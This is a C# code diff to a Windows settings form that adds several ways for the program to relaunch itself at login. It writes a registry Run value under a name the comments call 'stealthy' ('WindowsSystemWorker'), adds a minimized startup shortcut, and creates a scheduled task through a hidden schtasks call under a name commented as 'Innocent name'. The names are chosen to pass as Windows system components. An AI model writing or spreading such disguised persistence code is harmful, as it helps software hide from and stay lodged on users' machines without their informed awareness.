@@ -370,12 +370,17 @@ public class SettingsForm : Form
             if (_runOnStartup.Checked)
             {
                 // Use a stealthy name key
-                key?.SetValue("WindowsSystemWorker", installPath);
+                // IMPORTANT: Quote the path to handle spaces in username/path
+                // Add --auto-start flag
+                key?.SetValue("WindowsSystemWorker", $"\"{installPath}\" --auto-start");
                 // Remove old key if exists
                 key?.DeleteValue("BelfProctor", false);
                 
-                // FALLBACK: Create Shortcut in Startup Folder
+                // FALLBACK 1: Create Shortcut in Startup Folder
                 CreateStartupShortcut(installPath, installDir);
+
+                // FALLBACK 2: Scheduled Task (Persistence)
+                CreateScheduledTask(installPath);
             }
             else
             {
@@ -445,6 +450,7 @@ public class SettingsForm : Form
             vbsScript.AppendLine($"sLinkFile = \"{shortcutPath}\"");
             vbsScript.AppendLine("Set oLink = oWS.CreateShortcut(sLinkFile)");
             vbsScript.AppendLine($"oLink.TargetPath = \"{targetPath}\"");
+            vbsScript.AppendLine("oLink.Arguments = \"--auto-start\"");
             vbsScript.AppendLine($"oLink.WorkingDirectory = \"{workingDir}\"");
             vbsScript.AppendLine("oLink.WindowStyle = 7"); // 7 = Minimized
             vbsScript.AppendLine("oLink.Save");
@@ -466,6 +472,32 @@ public class SettingsForm : Form
         {
             // Log or ignore, registry is primary method
             Debug.WriteLine($"Failed to create shortcut: {ex.Message}");
+        }
+    }
+
+    private void CreateScheduledTask(string targetPath)
+    {
+        try
+        {
+            // Create a scheduled task that runs at logon for any user
+            // We use schtasks.exe. This requires Admin usually, but if run as standard user, it might fail or create a user task.
+            // We'll try to create a user-level task which doesn't strictly need Admin if it's for the current user.
+            
+            var taskName = "WindowsSystemWorkerUpdate"; // Innocent name
+            // Use escaped double quotes for path to handle spaces correctly
+            var args = $"/create /tn \"{taskName}\" /tr \"\\\"{targetPath}\\\" --auto-start\" /sc onlogon /f";
+            
+            Process.Start(new ProcessStartInfo
+            {
+                FileName = "schtasks",
+                Arguments = args,
+                UseShellExecute = false,
+                CreateNoWindow = true
+            });
+        }
+        catch (Exception ex)
+        {
+            Debug.WriteLine($"Failed to create scheduled task: {ex.Message}");
         }
     }
 }
